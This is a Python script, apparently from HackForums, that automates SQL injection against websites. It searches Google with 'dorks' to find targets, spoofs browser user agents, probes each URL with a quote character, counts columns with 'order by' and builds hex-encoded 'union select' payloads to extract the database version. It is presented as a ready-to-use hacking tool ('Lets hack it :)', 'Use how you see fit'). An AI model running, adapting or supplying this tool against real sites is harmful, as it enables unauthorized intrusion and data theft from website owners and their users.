#!/usr/bin/env python3.5
import urllib.request , webbrowser , urllib , json , random

print ("Welcome")

def Exit():
	print ("Goodbye :)")
	exit(0)
	
def credit():
	print ("Main Developer - MasterBlack\nScanner - RUii of HackForums\nUse how you see fit :)")
	
def version(connect, n):
	screenScrapeFour = urllib.request.urlopen(connect)
	screenScrapeFourText = screenScrapeFour.read()
	screenScrapeFourText = str(screenScrapeFourText)
	file2 = open("test.txt","a+")
	file2.write(screenScrapeFourText)
	for g in range(1, n+1):
		n = "<MB>" + str(g) + "</MB>"
		if n in screenScrapeFourText:
			print (n)
			mb = "".join("{:02x}".format(ord(c)) for c in n)
			j = "0x" + mb
			print (j)
			start = "<mb>"
			starte = "".join("{:02x}".format(ord(c)) for c in start)
			starty = "0x" + starte
			end = "</mb>"
			ende = "".join("{:02x}".format(ord(c)) for c in end)
			endy = "0x" + ende
			version = "group_concat(" + starty + ",version()," + endy + ")"
			connect = connect.replace(j, version)
			print (str(connect))
			'''webbrowser.open(connect)'''
			'''"""screenScrapeFive = urllib.request.urlopen(connect)
			screenScrapeFiveText = screenScrapeFive.read()
			screenScrapeFiveText = str(screenScrapeFiveText)"""'''

	
def url(urls):
	protocolOne = "http://"
	protocolTwo = "https://"
	if protocolOne in urls:
		http = urls
	elif protocolTwo in urls:
		http = urls
	else:
		http = "http://" + urls
	print(http)
	screenScrapeOne = urllib.request.urlopen(http)
	screenScrapeOneText = screenScrapeOne.read()
	screenScrapeOneText = str(screenScrapeOneText)
	t = "%27"
	test = http + t
	screenScrapeTwo = urllib.request.urlopen(test)
	screenScrapeTwoText = screenScrapeTwo.read()
	screenScrapeTwoText = str(screenScrapeTwoText)
	if screenScrapeOneText == screenScrapeTwoText:
		print ("Sorry")
	else:
		print ("Looks good, but just double checking it")
		order1 = http + "+order+by+1--"
		screenScrapeThree = urllib.request.urlopen(order1)
		screenScrapeThreeText = screenScrapeThree.read()
		screenScrapeThreeText = str(screenScrapeThreeText)
		if screenScrapeThreeText == screenScrapeTwoText:
			print ("Sorry")
		else:
			print ("Looks like it passed the second test. Lets hack it :)")
			end  = '--'
			ordering = "+order+by+"
			n = 1
			x = True
			while x:
				order = http + ordering + str(n) + end
				expect = "Unknown column"
				w1 = urllib.request.urlopen(order)
				q1 = w1.read()
				q1 = str(q1)
				if expect in q1:
					n = n - 1
					print ("It has " + str(n) + " columns")
					x = False
				else:
					n = n + 1
					print (order)
			union = "+union+select+"
			connect = http + union
			k = ","
			for g in range(1,n+1):
				mb = "\"/><MB>" + str(g) + "</MB>"
				mb = "".join("{:02x}".format(ord(c)) for c in mb)
				mbn = "0x" + mb
				connect = connect + mbn + k
				print (connect)
			connect = connect[:-1]
			connect = connect.replace("=","=-")
			connect = connect + '--'
			print(connect)
			'''webbrowser.open(connect)'''
			version(connect, n)
			
			
def scan():
	print ("Scanning . . .")
	count = 0
	#A dork example would be '.php?detail='
	query = input("Enter a dork / search term: ")
	#We are limited to 16 requests for some minutes and each will return 4 links, resulting in 64 links maximum
	try:
		for c in range (0,64,4):
			url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=%s&start=%s' % ( str(query) , str(c) )
			#The Data we want is on JSON format, we need to parse it
			raw_src = urllib.request.Request(url)
			items = [1, 2, 3, 4, 5]
			m = random.choice(items)
			if m == 1:
				agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
			elif m == 2:
				agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0"
			elif m == 3:
				agent = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64"
			elif m == 4:
				agent = "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
			elif m == 5:
				agent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36"
			raw_src.add_header('User-agent', agent)
			raw_src2 = urllib.request.urlopen(raw_src).read().decode("utf-8")
			json_results = json.loads(raw_src2)
			results = json_results['responseData']['results']
			for i in results:
				link = i['url']
				#We need to decode some characters now:(%2F,%3F,%3D,%26) to (/,?,=,&)
				link = urllib.request.unquote(link)
				file = open("scan.txt","a+")
				link = link + "\n"
				file.write(link)
				print (link)
				print ("It has been saved to file")
	except TypeError:
		print ("Looks like Google hates you :)")
	
dExit = True
while dExit:
	print ("\nScan - Scans Google for vulnerable websites\nUrl - Enter url to test\nCredit - For all who worked on this project\nExit - Exits applicaion")
	choice = input("Enter Choice: ")
	if choice == "Scan":
		scan()
	elif choice == "Url":
		c = input("Do you want to read from scanned file? y/n: ")
		if c == "y":
			filing = open("scan.txt" , "r")
			for line in filing:
				print(line)
				pp = input("Do you want to test website? y/n: ")
				if pp == "y":
					line = line[:-1]
					url(line)
		else:
			y = input("Enter url (without http://): ")
			url(y)
	elif choice == "Credit":
		credit()
	elif choice == "Exit":
		dExit = False
		Exit()
	else:
		print ("Unknown Command")

